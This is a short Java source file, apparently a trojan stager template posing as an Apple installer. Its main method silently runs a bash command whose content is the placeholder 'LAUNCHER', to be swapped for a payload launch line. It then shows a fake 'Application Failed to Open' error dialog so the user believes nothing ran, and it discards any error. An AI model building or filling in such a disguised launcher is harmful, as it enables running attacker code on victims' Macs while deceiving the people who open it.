package com.installer.apple;

import java.io.*;
import javax.swing.JOptionPane;

public class Run{
    public static void main(String[] args){

        String[] cmd = {
            "/bin/bash",
            "-c",
            "LAUNCHER"
        };
        
        try {
            Process p = Runtime.getRuntime().exec(cmd);
            JOptionPane.showMessageDialog(null, "Application Failed to Open", "Error", JOptionPane.INFORMATION_MESSAGE);
        }
        catch (IOException e){} 
    }
}